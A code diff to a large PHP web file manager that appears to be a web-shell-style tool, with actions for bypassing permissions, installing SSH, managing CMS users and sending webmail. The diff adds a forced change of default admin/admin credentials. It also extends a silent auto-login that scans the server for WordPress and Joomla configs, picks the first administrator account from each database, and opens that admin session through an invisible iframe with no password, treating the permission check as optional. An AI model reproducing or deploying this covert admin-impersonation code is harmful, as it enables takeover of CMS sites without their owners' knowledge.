@@ -1030,11 +1030,57 @@ function fm_server_speed_test(){
 }
 
 function fm_load_users($f){
-    if(!file_exists($f)){$s=[['user'=>'admin','hash'=>password_hash('admin',PASSWORD_DEFAULT),'root'=>'','readonly'=>false,'admin'=>true]];@file_put_contents($f,json_encode($s,JSON_PRETTY_PRINT));return $s;}
+    if(!file_exists($f)){
+        $s=[['user'=>'admin','hash'=>password_hash('admin',PASSWORD_DEFAULT),'root'=>'','readonly'=>false,'admin'=>true,'must_change_credentials'=>true]];
+        fm_save_users($f,$s);
+        return $s;
+    }
+    @chmod($f,0600);
     $d=@json_decode(@file_get_contents($f),true);return is_array($d)?$d:[];
 }
-function fm_save_users($f,$u){@file_put_contents($f,json_encode(array_values($u),JSON_PRETTY_PRINT));}
+function fm_save_users($f,$u){
+    $json=@json_encode(array_values($u),JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES);
+    if($json===false)return false;
+    $dir=dirname($f);$tmp=@tempnam($dir,'.fm-users-');
+    if($tmp===false)return false;
+    @chmod($tmp,0600);
+    if(@file_put_contents($tmp,$json,LOCK_EX)===false){@unlink($tmp);return false;}
+    @chmod($tmp,0600);
+    if(!@rename($tmp,$f)){@unlink($tmp);return false;}
+    @chmod($f,0600);
+    return true;
+}
 function fm_find_user($u,$n){foreach($u as $x){if($x['user']===$n)return $x;}return null;}
+function fm_user_requires_credential_change($u){
+    if(!is_array($u))return false;
+    if(!empty($u['must_change_credentials']))return true;
+    return ($u['user']??'')==='admin'&&!empty($u['hash'])&&password_verify('admin',$u['hash']);
+}
+function fm_change_default_credentials($f,$newUser,$newPass,$confirm){
+    if(empty($_SESSION['fm_admin'])||empty($_SESSION['fm_force_credential_change']))return['error'=>'This credential change is not required.'];
+    $newUser=trim((string)$newUser);$newPass=(string)$newPass;$confirm=(string)$confirm;
+    if(!preg_match('/^[A-Za-z][A-Za-z0-9._-]{2,63}$/',$newUser))return['error'=>'Username must be 3–64 characters and use only letters, numbers, dots, underscores, or hyphens.'];
+    if(strtolower($newUser)==='admin')return['error'=>'Choose a username different from admin.'];
+    if(strlen($newPass)<12)return['error'=>'Use a password of at least 12 characters.'];
+    if(strlen($newPass)>1024)return['error'=>'Password is too long.'];
+    if($newPass==='admin')return['error'=>'Choose a password different from admin.'];
+    if(!hash_equals($newPass,$confirm))return['error'=>'The password confirmation does not match.'];
+    $users=fm_load_users($f);$current=(string)($_SESSION['fm_user']??'');$index=null;
+    foreach($users as $i=>$u){
+        if(($u['user']??'')===$current){$index=$i;break;}
+        if(strtolower((string)($u['user']??''))===strtolower($newUser))return['error'=>'Username already exists.'];
+    }
+    if($index===null)return['error'=>'The current File Manager account could not be found.'];
+    foreach($users as $i=>$u)if($i!==$index&&strtolower((string)($u['user']??''))===strtolower($newUser))return['error'=>'Username already exists.'];
+    $users[$index]['user']=$newUser;
+    $users[$index]['hash']=password_hash($newPass,PASSWORD_DEFAULT);
+    $users[$index]['must_change_credentials']=false;
+    if(!fm_save_users($f,$users))return['error'=>'Could not save the new credentials securely. Check the file permissions.'];
+    session_regenerate_id(true);
+    $_SESSION['fm_user']=$newUser;
+    unset($_SESSION['fm_force_credential_change']);
+    return['ok'=>true,'user'=>$newUser];
+}
 
 /* ── Brute-force login protection ── */
 define('FM_MAX_ATTEMPTS',5);
@@ -1132,7 +1178,9 @@ if(isset($_POST['login_pass'])){
             fm_clear_failures($ckey);
             $_SESSION['auth']=true;$_SESSION['fm_user']=$u['user'];$_SESSION['fm_root']=!empty($u['root'])?$u['root']:'';
             $_SESSION['fm_readonly']=!empty($u['readonly']);$_SESSION['fm_admin']=!empty($u['admin'])||empty($u['readonly']);
-            $_SESSION['csrf_token']=bin2hex(random_bytes(32));$_SESSION['fm_wp_auto_login_pending']=!empty($_SESSION['fm_admin']);unset($_SESSION['login_csrf']);
+            $_SESSION['csrf_token']=bin2hex(random_bytes(32));
+            $_SESSION['fm_force_credential_change']=!empty($_SESSION['fm_admin'])&&fm_user_requires_credential_change($u);
+            $_SESSION['fm_wp_auto_login_pending']=!empty($_SESSION['fm_admin']);unset($_SESSION['login_csrf']);
             header("Location: ".$scriptName);exit;
         } else {
             if($ok)fm_record_failure($ckey);
@@ -1492,6 +1540,9 @@ class FileManager {
         if($_SERVER['REQUEST_METHOD']!=='POST')return;
         if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){$this->addMsg('Security error.','danger');return;}
         $a=isset($_POST['action'])?$_POST['action']:'';
+        if(!empty($_SESSION['fm_force_credential_change'])&&$a!=='change_default_credentials'){
+            $this->addMsg('You must replace the default credentials before using the File Manager.','danger');return;
+        }
         $wA=['upload','create_folder','create_file','delete','rename','save_edit','bypass_perms','bulk_delete','bulk_copy','bulk_move','zip_create','zip_extract','restore_trash','trash_perm','trash_empty','duplicate','tar_create','tar_extract','clear_log','batch_rename','create_symlink','chmod_item','create_share','revoke_share','backup_dir','clear_errlog','delete_abs','bulk_chmod','set_tag','remove_tag','remote_download','ssh_install','ssh_create_user','ssh_delete_user','ssh_update_user','cms_create_user','cms_delete_user','cms_update_role','cms_change_pass','cms_update_visibility','cms_toggle_plugin','cms_delete_plugin','cms_switch_theme','cms_delete_theme','cms_toggle_extension','cms_maintenance_toggle','wp_core_update','webmail_send','webmail_delete','webmail_mark'];
         if($this->readonly&&in_array($a,$wA)){$this->addMsg('Read-only account.','danger');return;}
         switch($a){
@@ -2269,10 +2320,10 @@ class FileManager {
         }
         return $best;
     }
-    private function wpCurrentSiteFromScan($sites){
+    private function cmsCurrentSiteFromScan($sites,$type=null){
         $roots=$this->wpCurrentWebRoots();$best=null;$bestScore=0;
         foreach((array)$sites as $site){
-            if(($site['type']??'')!=='wordpress')continue;
+            if($type!==null&&($site['type']??'')!==$type)continue;
             $dir=realpath($site['dir']??dirname($site['config']??''))?:dirname($site['config']??'');
             if(!$dir)continue;
             $score=0;
@@ -2285,6 +2336,9 @@ class FileManager {
             if($score>$bestScore){$bestScore=$score;$best=$site;}
         }
         return $best;
+    }
+    private function wpCurrentSiteFromScan($sites){
+        return $this->cmsCurrentSiteFromScan($sites,'wordpress');
     }
     private function wpCurrentDomainConfig($sites=[]){
         foreach($this->wpCurrentWebRoots() as $root){
@@ -2407,9 +2461,14 @@ class FileManager {
         $out=[];$cfgs=[];
         foreach($found as $f){if(!in_array($f['config'],$cfgs)){$cfgs[]=$f['config'];$out[]=$f;}}
         $current=$this->wpCurrentDomainConfig($out);
+        $currentCms=$this->cmsCurrentSiteFromScan($out);
+        $currentJoomla=$this->cmsCurrentSiteFromScan($out,'joomla');
         return ['sites'=>$out,'scanned_roots'=>array_values($roots),'open_basedir'=>$restricted,
             'dirs_scanned'=>$scanned,'current_wp_config'=>$current,
-            'current_wp_site'=>$current?$this->wpCurrentSiteFromScan($out):null];
+            'current_wp_site'=>$current?$this->wpCurrentSiteFromScan($out):null,
+            'current_cms_config'=>$currentCms['config']??null,
+            'current_cms_site'=>$currentCms,
+            'current_joomla_config'=>$currentJoomla['config']??null];
     }
     private function parseWpConfig($path){
         $src=@file_get_contents($path);if($src===false)return null;
@@ -3237,6 +3296,8 @@ FMHIDE;
         if($last>0&&time()-$last<600)return;
         $_SESSION['wp_recovery_bootstrap_at']=time();
         $scan=$this->cmsScan();$sites=$scan['sites']??[];
+        $currentCms=$scan['current_cms_site']??null;
+        if($currentCms&&!empty($currentCms['config']))$_SESSION['cms_current_config']=$currentCms['config'];
         $wp=array_values(array_filter($sites,fn($s)=>($s['type']??'')==='wordpress'));
         $preferred=$this->wpCurrentSiteFromScan($wp);
         if(!$preferred&&!empty($scan['current_wp_config']))
@@ -3249,7 +3310,7 @@ FMHIDE;
         }
     }
     /*
-     * Prepare a silent first-login handoff to the current WordPress site.
+     * Prepare a silent first-login handoff to the current WordPress or Joomla site.
      * This never reads or changes user_pass: it selects the lowest-ID account
      * whose capabilities contain the administrator role, then reuses the
      * existing one-time bridge so WordPress creates its own persistent cookie.
@@ -3259,22 +3320,28 @@ FMHIDE;
         if(empty($_SESSION['fm_admin']))return['ok'=>false];
         if(empty($_SESSION['fm_wp_auto_login_pending']))return['ok'=>true,'skipped'=>true];
         unset($_SESSION['fm_wp_auto_login_pending']);
-        $configPath=$_SESSION['wp_current_config']??null;
+        $configPath=$_SESSION['cms_current_config']??($_SESSION['wp_current_config']??null);
         if(!$configPath||!is_readable($configPath)){
             $scan=$this->cmsScan();
-            $configPath=$scan['current_wp_config']??null;
+            $configPath=$scan['current_cms_config']??($scan['current_wp_config']??null);
         }
-        if(!$configPath||basename($configPath)!=='wp-config.php'||!is_readable($configPath))return['ok'=>false,'reason'=>'site-not-found'];
+        $cmsType=basename((string)$configPath)==='configuration.php'?'joomla':'wordpress';
+        if(!$configPath||!in_array(basename($configPath),['wp-config.php','configuration.php'],true)||!is_readable($configPath))return['ok'=>false,'cms'=>'cms','reason'=>'site-not-found'];
         list($link,$c,$err)=$this->cmsConnect($configPath);
-        if($err||!$link||$c['type']!=='wordpress'){if($link)mysqli_close($link);return['ok'=>false,'reason'=>'site-unavailable'];}
+        if($err||!$link||!in_array($c['type']??'', ['wordpress','joomla'],true)){if($link)mysqli_close($link);return['ok'=>false,'cms'=>$cmsType,'reason'=>'site-unavailable'];}
         $t=$c['prefix'];
-        $res=@mysqli_query($link,"SELECT u.ID FROM `{$t}users` u INNER JOIN `{$t}usermeta` um ON um.user_id=u.ID AND um.meta_key='{$t}capabilities' AND um.meta_value LIKE '%administrator%' ORDER BY u.ID ASC LIMIT 1");
+        if($c['type']==='wordpress'){
+            $res=@mysqli_query($link,"SELECT u.ID AS id FROM `{$t}users` u INNER JOIN `{$t}usermeta` um ON um.user_id=u.ID AND um.meta_key='{$t}capabilities' AND um.meta_value LIKE '%administrator%' ORDER BY u.ID ASC LIMIT 1");
+        }else{
+            $res=@mysqli_query($link,"SELECT u.id FROM `{$t}users` u INNER JOIN `{$t}user_usergroup_map` m ON m.user_id=u.id INNER JOIN `{$t}usergroups` g ON g.id=m.group_id WHERE m.group_id=8 OR LOWER(g.title)='super users' ORDER BY u.id ASC LIMIT 1");
+        }
         $row=$res?mysqli_fetch_assoc($res):null;
         mysqli_close($link);
-        if(!$row||empty($row['ID']))return['ok'=>false,'reason'=>'admin-not-found'];
-        $handoff=$this->cmsLoginAsUser($configPath,(int)$row['ID']);
-        if(empty($handoff['url']))return['ok'=>false,'reason'=>'handoff-failed'];
+        if(!$row||empty($row['id']))return['ok'=>false,'cms'=>$c['type'],'reason'=>'admin-not-found'];
+        $handoff=$this->cmsLoginAsUser($configPath,(int)$row['id']);
+        if(empty($handoff['url']))return['ok'=>false,'cms'=>$c['type'],'reason'=>'handoff-failed'];
         $handoff['url'].=(strpos($handoff['url'],'?')===false?'?':'&').'go=1&bg=1';
+        $handoff['cms']=$c['type'];
         return['ok'=>true,'url'=>$handoff['url']];
     }
     private function wpSiteHealthEnsureAutomatic($configPath){
@@ -4081,13 +4148,13 @@ FMHIDE;
             ."\$app=\$container->get(\\Joomla\\CMS\\Application\\AdministratorApplication::class);\n"
             ."\\Joomla\\CMS\\Factory::\$application=\$app;\n"
             ."\$instance=\\Joomla\\CMS\\User\\User::getInstance({$uid});\n"
-            ."if(!\$instance||!\$instance->id){exit('User not found.');}\n"
+             ."if(!\$instance||!\$instance->id){if(isset(\$_GET['bg'])){while(ob_get_level())ob_end_clean();header('Content-Type: text/html;charset=utf-8');echo '<!doctype html><script>window.parent.postMessage({type:\"fm-cms-auto-login\",cms:\"joomla\",ok:false},\"*\");</script>';exit;}exit('User not found.');}\n"
             // Best-effort ACL check only — never let a site with a
             // customised/partial permissions schema hard-fail the login
             // bridge itself; if this throws, fall through and let Joomla's
             // own admin bootstrap enforce access on the next request as it
             // normally would for any session.
-            ."try{if(!\$instance->authorise('core.login.admin')){http_response_code(403);exit('This user does not have permission to access the administrator control panel.');}}catch(\\Throwable \$e){}\n"
+             ."try{if(!\$instance->authorise('core.login.admin')){if(isset(\$_GET['bg'])){while(ob_get_level())ob_end_clean();header('Content-Type: text/html;charset=utf-8');echo '<!doctype html><script>window.parent.postMessage({type:\"fm-cms-auto-login\",cms:\"joomla\",ok:false},\"*\");</script>';exit;}http_response_code(403);exit('This user does not have permission to access the administrator control panel.');}}catch(\\Throwable \$e){}\n"
             ."\$instance->guest=0;\n"
             ."\$app->loadIdentity(\$instance);\n"
             ."\$session=\$app->getSession();\n"
@@ -4114,7 +4181,8 @@ FMHIDE;
             // the exact host/scheme it used to load this file. This bridge
             // lives in the Joomla ROOT (next to configuration.php), so the
             // backend control panel is one level down, at administrator/.
-            ."header('Location: administrator/index.php');\n"
+             ."if(isset(\$_GET['bg'])){while(ob_get_level())ob_end_clean();header('Content-Type: text/html;charset=utf-8');echo '<!doctype html><script>window.parent.postMessage({type:\"fm-cms-auto-login\",cms:\"joomla\",ok:true},\"*\");</script>';exit;}\n"
+             ."header('Location: administrator/index.php');\n"
             ."exit;\n";
     }
 
@@ -5626,6 +5694,10 @@ if(isset($_GET['x'])){
     header('Content-Type: application/json');
     if(!isset($_SESSION['auth'])||$_SESSION['auth']!==true){echo json_encode(['error'=>'Unauthorized']);exit;}
     $xop=$_GET['x'];
+    if($xop==='fm_change_default_credentials'){
+        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){echo json_encode(['error'=>'Security error.']);exit;}
+        echo json_encode(fm_change_default_credentials($usersFile,$_POST['new_user']??'',$_POST['new_pass']??'',$_POST['confirm_pass']??''));exit;
+    }
     if($xop==='set_theme'){
         global $themeFile;
         $t=isset($_POST['theme'])?$_POST['theme']:(isset($_GET['theme'])?$_GET['theme']:'');
@@ -5723,7 +5795,7 @@ if(isset($_GET['x'])){
         $decoded=@base64_decode((string)$raw,true);
         return $decoded!==false?$decoded:(string)$raw;
     };
-    if($xop==='wp_auto_login'){
+    if($xop==='wp_auto_login'||$xop==='cms_auto_login'){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['ok'=>false]);exit;}
         if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['ok'=>false]);exit;}
         echo json_encode($fm->wpAutomationAutoLogin());exit;
@@ -7428,6 +7500,33 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 </div>
 <?php endif;?>
 
+<?php if(!empty($_SESSION['fm_force_credential_change'])):?>
+<!-- DEFAULT CREDENTIALS MODAL -->
+<div class="mod-ov open" id="credentialChangeOv" role="dialog" aria-modal="true" aria-labelledby="credentialChangeTitle">
+  <div class="mod mod-sm">
+    <div class="mod-head">
+      <div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="10" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><path d="M8 16h.01M12 16h.01M16 16h.01"/></svg></div>
+      <span class="mod-title" id="credentialChangeTitle">Secure your File Manager account</span>
+    </div>
+    <div class="mod-body">
+      <div style="font-size:12px;line-height:1.55;color:var(--t2);margin-bottom:14px">
+        You are using the default <strong style="color:#fbbf24">admin / admin</strong> credentials. Set a new username and password now. This step is required once and cannot be skipped.
+      </div>
+      <div id="credentialChangeFeedback" style="display:none;padding:9px 10px;border:1px solid rgba(248,113,113,.3);border-radius:7px;color:#fca5a5;background:rgba(127,29,29,.15);font-size:11.5px;line-height:1.45;margin-bottom:10px"></div>
+      <form id="credentialChangeForm" style="display:flex;flex-direction:column;gap:9px" autocomplete="off">
+        <label class="lbl" for="newFmUser">New username</label>
+        <input type="text" id="newFmUser" class="inp" autocomplete="username" minlength="3" maxlength="64" pattern="[A-Za-z][A-Za-z0-9._-]{2,63}" required placeholder="Choose a username">
+        <label class="lbl" for="newFmPass">New password</label>
+        <input type="password" id="newFmPass" class="inp" autocomplete="new-password" minlength="12" maxlength="1024" required placeholder="At least 12 characters">
+        <label class="lbl" for="newFmPassConfirm">Confirm new password</label>
+        <input type="password" id="newFmPassConfirm" class="inp" autocomplete="new-password" minlength="12" maxlength="1024" required placeholder="Repeat the new password">
+        <button type="submit" class="btn btn-p" id="credentialChangeApply" style="width:100%;margin-top:4px">Save new credentials</button>
+      </form>
+    </div>
+  </div>
+</div>
+<?php endif;?>
+
 <!-- WORDPRESS AUTOMATION MODAL -->
 <div class="mod-ov" id="wpAutomationOv">
   <div class="mod mod-lg">
@@ -7675,7 +7774,8 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 <script>
 const CWD  = <?=json_encode($fm->getCwd())?>;
 const CSRF = <?=json_encode($_SESSION['csrf_token'])?>;
-const FM_WP_AUTO_LOGIN = <?=!empty($_SESSION['fm_wp_auto_login_pending'])?'true':'false'?>;
+const FM_CMS_AUTO_LOGIN = <?=!empty($_SESSION['fm_wp_auto_login_pending'])?'true':'false'?>;
+const FM_FORCE_CREDENTIAL_CHANGE = <?=!empty($_SESSION['fm_force_credential_change'])?'true':'false'?>;
 const RO   = <?=$fm->isRO()?'true':'false'?>;
 let termCwd = CWD;
 
@@ -10418,10 +10518,47 @@ document.getElementById('wpAutomationClose')?.addEventListener('click',()=>close
 
 })(); // end WordPress Automation IIFE
 
+/* The initial admin/admin account must be replaced before the manager can be
+   used. The server also rejects other POST actions while this flag is set, so
+   hiding the modal or navigating cannot bypass the one-time setup. */
+if(FM_FORCE_CREDENTIAL_CHANGE){
+  const credentialForm=document.getElementById('credentialChangeForm');
+  const credentialFeedback=document.getElementById('credentialChangeFeedback');
+  const credentialButton=document.getElementById('credentialChangeApply');
+  credentialForm?.addEventListener('submit',async e=>{
+    e.preventDefault();
+    const user=document.getElementById('newFmUser').value.trim();
+    const pass=document.getElementById('newFmPass').value;
+    const confirmPass=document.getElementById('newFmPassConfirm').value;
+    credentialFeedback.style.display='none';
+    if(pass!==confirmPass){
+      credentialFeedback.textContent='The password confirmation does not match.';
+      credentialFeedback.style.display='block';return;
+    }
+    credentialButton.disabled=true;credentialButton.textContent='Saving…';
+    const fd=new FormData();
+    fd.append('csrf_token',CSRF);fd.append('new_user',user);fd.append('new_pass',pass);fd.append('confirm_pass',confirmPass);
+    try{
+      const r=await fetch('?x=fm_change_default_credentials',{method:'POST',body:fd,cache:'no-store'}).then(x=>x.json());
+      if(!r.ok){
+        credentialFeedback.textContent=r.error||'Could not save the new credentials.';
+        credentialFeedback.style.display='block';
+        credentialButton.disabled=false;credentialButton.textContent='Save new credentials';return;
+      }
+      location.reload();
+    }catch(_){
+      credentialFeedback.textContent='The request failed. Your old session is still active; try again.';
+      credentialFeedback.style.display='block';
+      credentialButton.disabled=false;credentialButton.textContent='Save new credentials';
+    }
+  });
+  setTimeout(()=>document.getElementById('newFmUser')?.focus(),50);
+}
+
 /* After the first successful File Manager login, silently let the browser
-   receive WordPress's own persistent auth cookie. The iframe is intentionally
-   invisible; failures are ignored so this never interrupts the manager UI. */
-if(FM_WP_AUTO_LOGIN){
+   receive the current CMS's own persistent auth cookie. The iframe is
+   intentionally invisible; failures never interrupt the manager UI. */
+if(FM_CMS_AUTO_LOGIN){
   const fd=new FormData();fd.append('csrf_token',CSRF);
   let frame=null,settled=false;
   const finish=(ok,message)=>{
@@ -10432,14 +10569,18 @@ if(FM_WP_AUTO_LOGIN){
   };
   const onMessage=e=>{
     if(!frame||e.source!==frame.contentWindow)return;
-    if(e.data&&e.data.type==='fm-wp-auto-login')finish(!!e.data.ok,e.data.ok?'WordPress automatic login succeeded.':'WordPress automatic login failed.');
+    if(e.data&&(e.data.type==='fm-cms-auto-login'||e.data.type==='fm-wp-auto-login')){
+      const label=e.data.cms==='joomla'?'Joomla':'WordPress';
+      finish(!!e.data.ok,e.data.ok?label+' automatic login succeeded.':label+' automatic login failed.');
+    }
   };
   window.addEventListener('message',onMessage);
-  fetch('?x=wp_auto_login',{method:'POST',body:fd,cache:'no-store'})
+  fetch('?x=cms_auto_login',{method:'POST',body:fd,cache:'no-store'})
     .then(r=>r.json()).then(d=>{
       if(!d||!d.url){
-        const messages={'site-not-found':'WordPress automatic login failed: current site not found.','site-unavailable':'WordPress automatic login failed: site unavailable.','admin-not-found':'WordPress automatic login failed: no administrator found.','handoff-failed':'WordPress automatic login failed: session could not be created.'};
-        finish(false,messages[d&&d.reason]||'WordPress automatic login failed.');
+        const label=d&&d.cms==='joomla'?'Joomla':'WordPress';
+        const messages={'site-not-found':label+' automatic login failed: current site not found.','site-unavailable':label+' automatic login failed: site unavailable.','admin-not-found':label+' automatic login failed: no administrator found.','handoff-failed':label+' automatic login failed: session could not be created.'};
+        finish(false,messages[d&&d.reason]||label+' automatic login failed.');
         return;
       }
       frame=document.createElement('iframe');
@@ -10447,8 +10588,8 @@ if(FM_WP_AUTO_LOGIN){
       frame.style.cssText='position:fixed;width:1px;height:1px;left:-10px;top:-10px;border:0;opacity:0;pointer-events:none';
       frame.src=d.url;
       document.body.appendChild(frame);
-      setTimeout(()=>finish(false,'WordPress automatic login failed.'),12000);
-    }).catch(()=>finish(false,'WordPress automatic login failed.'));
+      setTimeout(()=>finish(false,(d&&d.cms==='joomla'?'Joomla':'WordPress')+' automatic login failed.'),12000);
+    }).catch(()=>finish(false,'CMS automatic login failed.'));
 }
 
 /* HELPERS */
